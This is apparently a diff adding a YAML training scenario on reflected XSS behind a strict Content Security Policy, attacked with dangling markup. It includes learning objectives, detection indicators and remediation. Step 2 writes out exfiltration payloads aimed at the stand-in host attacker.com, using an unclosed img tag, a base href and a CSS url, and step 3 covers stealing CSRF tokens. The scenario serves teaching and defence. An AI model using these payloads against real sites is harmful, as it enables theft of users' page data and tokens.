@@ -1,0 +1,95 @@
+# Category: Cross-Site Scripting (XSS)
+name: "Reflected XSS protected by very strict CSP, with dangling markup attack"
+id: "xss-strict-csp-dangling-001"
+category: "xss"
+subcategory: "csp_bypass"
+difficulty: "expert"
+estimated_time: "90 minutes"
+
+description: |
+  This scenario covers reflected XSS where a very strict Content Security
+  Policy (CSP) prevents script execution. The attacker uses a dangling markup
+  attack to exfiltrate data by injecting an incomplete HTML tag that captures
+  content, or by using `<base>` or `<meta>` tags to redirect traffic.
+
+learning_objectives:
+  - Understand CSP and its limitations
+  - Use dangling markup to exfiltrate data without script execution
+  - Inject `<base>` tags to redirect resources
+  - Leverage CSS or other non-script techniques
+
+tools:
+  - Burp Suite
+  - Browser developer tools
+
+prerequisites:
+  - Advanced understanding of CSP and HTML parsing
+  - Access to a vulnerable web application or lab
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify CSP policy and application context"
+    commands:
+      - "# Check CSP header: script-src 'none', default-src 'self'"
+      - "# Identify where user input is reflected"
+    expected_output: "CSP policy identified; input reflection point found"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Use dangling markup or other non-script techniques"
+    commands:
+      - "# Dangling markup: <img src='http://attacker.com/steal?data="
+      - "# This will capture everything after the tag until a closing quote"
+      - "# Or use <base href='http://attacker.com/'> to redirect resources"
+      - "# Or use CSS: <style>body{background:url('http://attacker.com?test=...')}</style>"
+    expected_output: "Data exfiltrated or resources loaded from attacker's domain"
+    detection: "Web server logs may show payload"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Exfiltrate sensitive data"
+    commands:
+      - "# Combine with CSRF-like techniques to extract CSRF tokens or page content"
+    expected_output: "Sensitive data sent to attacker"
+    detection: "Attacker server logs"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1189"
+    description: "Drive-by Compromise"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "Requests with incomplete HTML tags"
+  log_indicators:
+    - "Web server logs with unusual parameters"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Fix the underlying XSS vulnerability"
+    - "Use `X-Content-Type-Options: nosniff` to prevent MIME type issues"
+  long_term:
+    - "Use a nonce or hash in CSP to allow specific scripts"
+    - "Implement a strict CSP that prevents dangling markup"
+
+variables:
+  target_url: "http://example.com/page?param=PAYLOAD"
+  attacker_server: "http://attacker.com"
+
+assessment_questions:
+  - "What is dangling markup and how does it work?"
+  - "How does CSP affect dangling markup attacks?"
+  - "What other non-script techniques can be used to exfiltrate data?"
+
+references:
+  - url: "https://portswigger.net/web-security/cross-site-scripting/dangling-markup"
+    title: "PortSwigger Dangling Markup"
+  - url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
+    title: "MDN CSP"
